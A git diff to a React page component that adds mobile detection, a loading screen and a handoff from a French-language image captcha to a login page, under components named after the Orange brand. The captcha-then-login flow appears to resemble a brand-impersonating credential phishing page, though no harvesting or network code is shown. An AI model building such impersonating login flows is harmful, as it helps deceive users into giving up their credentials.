@@ -1,15 +1,33 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { RefreshCw } from 'lucide-react';
 import OrangeHeader from '@/components/OrangeHeader';
 import OrangeFooter from '@/components/OrangeFooter';
 import CaptchaSelector from '@/components/CaptchaSelector';
 import CaptchaGrid from '@/components/CaptchaGrid';
+import CaptchaMobile from '@/components/CaptchaMobile';
+import LoadingScreen from '@/components/LoadingScreen';
+import LoginWeb from '@/pages/LoginWeb';
+import LoginMobile from '@/pages/LoginMobile';
 import { Button } from '@/components/ui/button';
 
 const CaptchaPage = () => {
+  const [isMobile, setIsMobile] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  const [showLogin, setShowLogin] = useState(false);
   const captchaItems = ['Tortue', 'Café', 'Oiseau', 'Lion', 'Chat', 'Chaussure'];
   const [completedItems, setCompletedItems] = useState<string[]>([]);
   const [validatedImages, setValidatedImages] = useState<number[]>([]);
+
+  useEffect(() => {
+    const checkScreenSize = () => {
+      setIsMobile(window.innerWidth < 768); // Breakpoint mobile
+    };
+
+    checkScreenSize();
+    window.addEventListener('resize', checkScreenSize);
+
+    return () => window.removeEventListener('resize', checkScreenSize);
+  }, []);
 
   const currentItem = captchaItems.find(item => !completedItems.includes(item)) || '';
   const isCompleted = completedItems.length === captchaItems.length;
@@ -45,10 +63,35 @@ const CaptchaPage = () => {
 
   const handleContinue = () => {
     if (isCompleted) {
-      console.log('Captcha completed successfully!');
+      setIsLoading(true);
     }
   };
 
+  const handleCaptchaComplete = () => {
+    setIsLoading(true);
+  };
+
+  const handleLoadingComplete = () => {
+    setIsLoading(false);
+    setShowLogin(true);
+  };
+
+  // Si on affiche la page de login
+  if (showLogin) {
+    return isMobile ? <LoginMobile /> : <LoginWeb />;
+  }
+
+  // Si on affiche l'écran de chargement
+  if (isLoading) {
+    return <LoadingScreen onComplete={handleLoadingComplete} />;
+  }
+
+  // Si c'est mobile, afficher le composant mobile
+  if (isMobile) {
+    return <CaptchaMobile onComplete={handleCaptchaComplete} />;
+  }
+
+  // Sinon, afficher la version desktop
   return (
     <div className="min-h-screen flex flex-col bg-background">
       <OrangeHeader />
